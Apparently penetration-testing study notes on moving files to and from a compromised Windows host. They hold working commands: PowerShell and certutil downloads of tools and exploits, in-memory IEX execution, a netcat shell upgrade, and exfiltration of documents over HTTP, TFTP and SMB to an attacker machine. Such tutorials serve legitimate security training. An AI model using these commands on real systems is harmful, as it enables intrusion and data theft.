# File Transfers
## Table of Contents
- [Exfiltration](#exfiltration)
- [Preparation](#preparation)
  - [Installing Pure-FTPd](#installing-pure-ftpd)
  - [Upgrading a Non-Interactive Shell](#upgrading-a-non-interactive-shell)
- [Transferring Files with Windows Hosts](#transferring-files-with-windows-hosts)
  - [Non-Interactive FTP Download](#non-interactive-ftp-download)
  - [Windows Downloads Using Scripting Languages](#windows-downloads-using-scripting-languages)
  - [Windows Downloads with exe2hex and PowerShell](#windows-downloads-with-exe2hex-and-powershell)
  - [Windows Uploads Using Windows Scripting Languages](#windows-uploads-using-windows-scripting-languages)
  - [Uploading Files with TFTP](#uploading-files-with-tftp)
  - [Downloading Files with Certutil](#downloading-files-with-certutil)
  - [Download and Upload using SMB](#download-and-upload-using-smb)
- [FTP Tutorial](#ftp-tutorial)

## Exfiltration
- https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#scp

Note: If FTP and nc will not work try with [/dev/tcp](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#dev-tcp)
## Preparation
### Installing Pure-FTPd
Installing Pure-FTP on Kali
```sh
kali@kali:~$ sudo apt update && sudo apt install pure-ftpd
```
Before any clients can connect to our FTP server, we need to [create a new user for Pure-FTPd](#file-setup-ftp-sh). 

### Upgrading a Non-Interactive Shell
Most Netcat-like tools provide a non-interactive shell, which means that programs that require user input such as many file transfer programs or su and sudo tend to work poorly, if at all. Non-interactive shells also lack useful features like tab completion and job control. 

Upgrading our shell with Python w/ `python -c 'import pty; pty.spawn("/bin/bash")'`:
```sh
kali@kali:~$ nc -vn 10.11.0.128 4444
(UNKNOWN) [10.11.0.128] 4444 (?) open
python -c 'import pty; pty.spawn("/bin/bash")'
student@debian:~$
```

Ref: [How to Get a Fully Interactive Shell](https://gist.github.com/A-Pisani/66049cd20ab56e1d5b4a3870a14ed5af#how-to-get-a-fully-interactive-shell)
## Transferring Files with Windows Hosts
Disclaimer: This section assumes a victim WIndows machine was compromised and we have a bind shell in our Kali attacker machine.
### Non-Interactive FTP Download

Windows operating systems ship with a default FTP client that can be used for file transfers. 
- The FTP client is an interactive program that requires input to complete.
- The ftp **`-s`** option accepts a text-based command list that effectively makes the client non-interactive.

On our attacking machine, we will set up an FTP server, and we will initiate a download request for the Netcat binary from the compromised Windows host.

1. First, we will place a copy of `nc.exe` in our `/ftphome` directory:
    ```sh
    kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
    ```
2. build a text file of FTP commands we wish to execute, using the `echo` command.
    ```sh
    C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
    C:\Users\offsec>echo USER offsec>> ftp.txt
    C:\Users\offsec>echo lab>> ftp.txt
    C:\Users\offsec>echo bin >> ftp.txt
    C:\Users\offsec>echo GET nc.exe >> ftp.txt
    C:\Users\offsec>echo bye >> ftp.txt
    ```
    - The command file begins with the open command, which initiates an FTP connection to the specified IP address. 
    - Authenticate as offsec with the `USER` command and supply the password, lab. 
    - Rrequest a binary file transfer with `bin` and issue the `GET` request for `nc.exe`. 
    - Close the connection with the `bye` command.
3. Using FTP non-interactively
    ```sh
    C:\Users\offsec> ftp -v -n -s:ftp.txt
    ```
### Windows Downloads Using Scripting Languages
We can leverage scripting engines such as VBScript (in Windows XP, 2003) and PowerShell (in Windows 7, 2008, and above) to download files to our victim machine. 

#### VBScript
Creating a VBScript HTTP downloader script
```sh
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```
We can run this (with `cscript`) to download files from our Kali machine:
```sh
C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```
#### PowerShell
Executing the PowerShell HTTP downloader script as a one-liner
```sh
C:\Users\Offsec> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```
Executing a remote PowerShell script directly from memory (don't save on disk)
```sh
C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
Hello World
```
### Windows Downloads with exe2hex and PowerShell
Starting on our Kali machine, we will:
1. compress the binary we want to transfer, 
    ```sh
    kali@kali:~$ upx -9 nc.exe
    ```
2. convert it to a hex string, and embed it into a Windows script.
    ```sh
    kali@kali:~$ exe2hex -x nc.exe -p nc.cmd
    ```
3. copy the script to the clipbpard
    ```sh
    cat nc.cmd | xclip -selection clipboard
    ```
On the Windows machine, we will paste this script into our shell and run it. It will redirect the hex data into `powershell.exe`, which will assemble it back into a binary. This will be done through a series of non-interactive commands.

### Windows Uploads Using Windows Scripting Languages
In certain scenarios, we may need to exfiltrate data from a target network using a Windows client. This can be complex since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows by default.

Fortunately, if outbound HTTP traffic is allowed, we can use the `System.Net.WebClient` PowerShell class to upload data to our Kali machine through an HTTP POST request.

To do this, we can create the following PHP script and save it as `upload.php` in our Kali webroot directory, `/var/www/html`:
```php
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
Then we need to create the `uploads` folder and modify its permissions, granting the `www-data` user ownership and subsequent write permissions:
```sh
kali@kali:/var/www$ sudo mkdir /var/www/uploads

kali@kali:/var/www$ ps -ef | grep apache
root      1946     1  0 21:39 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  1947  1946  0 21:39 ?        00:00:00 /usr/sbin/apache2 -k start

kali@kali:/var/www$ sudo chown www-data: /var/www/uploads
```
With Apache and the PHP script ready to receive our file, we move to the compromised Windows host:
```cmd
C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```
### Uploading Files with TFTP
- While the Windows-based file transfer methods shown above work on all Windows versions since Windows 7 and Windows Server 2008 R2, we may run into problems when encountering older operating systems.  
- PowerShell, while very powerful and often-used, is not installed by default on operating systems like Windows XP and Windows Server 2003, which are still found in some production networks. 
- While both VBScript and the FTP client are present and will work, in this section we will discuss another file transfer method that may be effective in the field.

[TFTP](https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol) is a UDP-based file transfer protocol and is often restricted by corporate egress firewall rules.

1. Install and configure a TFTP server in Kali and create a directory to store and serve files. Next, we update the ownership of the directory so we can write files to it:
    ```sh
    kali@kali:~$ sudo apt update && sudo apt install atftp
    kali@kali:~$ sudo mkdir /tftp
    kali@kali:~$ sudo chown nobody: /tftp
    kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
    ```
2. On the Windows system, we will run the tftp client with -i to specify a binary image transfer, the IP address of our Kali system, the put command to initiate an upload, and finally the filename of the file to upload.
    ```cmd
    C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
    Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s
    ```
### Downloading Files with Certutil
```cmd
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```
Ref: https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil
### Download and Upload using SMB
Once we gain a foothold on a host which was know to use have SMB.

- On Kali, start an SMB server using impacket:
    ```sh
    # impacket-smbserver [-username USERNAME] [-password PASSWORD] shareName sharePATH
    kali@kali:~$ impacket-smbserver exfil .             # Generate a share named "exfil" in the current directory
    ```
- On the compromised Windows host:
    ```cmd
    C:\WINDOWS\Tasks> net use * \\<KALI_IP>\exfil
    Drive Z: is now connected to \\<KALI_IP>\exfil.
    ```
- Download files (eg nc.exe) to the compromised Windows host:
    ```cmd
    C:\WINDOWS\Tasks> copy Z:\nc.exe
    ```
- Upload files (eg nc.exe) from the compromised Windows host:
    ```cmd
    C:\WINDOWS\Tasks> copy C:\juicy.txt Z:\loot
    ```
#### Troubleshooting
If you have the following errors:
- System error 384 has occurred. You can't connect to the file share because it's not secure. This share requires the obsolete SMB1 protocol, which is unsafe and could expose your system to attack. Your system requires SMB2 or higher. For more info on resolving this issue, see: https://go.microsoft.com/fwlink/?linkid=852747
  - You may try adding `-smb2support` switches to see if it'll resolve the issue.
- You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
  - You may try adding `-username [username] -password [password] -smb2support` switches to see if it'll resolve the issue.
  - In addition, you may then connect to the smb share from your windows machine as the following:
      ```cmd
      net use m: \\192.168.x.x\[share_folder] /user:[username] [password] /persistent:yes
      ```
  
## FTP Tutorial
- Conneting to host and port (default 21) using anonymous access:
    ```sh
    kali@kali:~$ ftp <host> <port>
    Connected to 192.168.147.53.
    220 Microsoft FTP Service
    Name (192.168.147.53:kali): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password: 
    230 User logged in.
    Remote system type is Windows_NT.
    ```
- Getting help:
    ```sh
    ftp> ?
    Commands may be abbreviated.  Commands are:

    !               delete          hash            mlsd            pdir            remopts         struct
    $               dir             help            mlst            pls             rename          sunique
    account         disconnect      idle            mode            pmlsd           reset           system
    append          edit            image           modtime         preserve        restart         tenex
    ascii           epsv            lcd             more            progress        rhelp           throttle
    bell            epsv4           less            mput            prompt          rmdir           trace
    binary          epsv6           lpage           mreget          proxy           rstatus         type
    bye             exit            lpwd            msend           put             runique         umask
    case            features        ls              newer           pwd             send            unset
    cd              fget            macdef          nlist           quit            sendport        usage
    cdup            form            mdelete         nmap            quote           set             user
    chmod           ftp             mdir            ntrans          rate            site            verbose
    close           gate            mget            open            rcvbuf          size            xferbuf
    cr              get             mkdir           page            recv            sn
    ```
- Using ftp in Active mode:
    ```sh
    ftp> passive off
    Passive mode: off; fallback to active mode: off.
    ```
- Uploading a binary file:
    ```sh
    ftp> put                                                       
    (local-file) /var/lib/veil/output/source/payload.bat
    (remote-file) payload.bat
    local: /var/lib/veil/output/source/payload.bat remote: payload.bat
    200 EPRT command successful.
    125 Data connection already open; Transfer starting.
    100% |*********************************************************************************|  2303       16.76 MiB/s    00:00 ETA
    226 Transfer complete.                                         
    2303 bytes sent in 00:00 (127.63 KiB/s)
    ```
- Exit ftp:
    ```sh
    ftp> exit
    bye
    ```
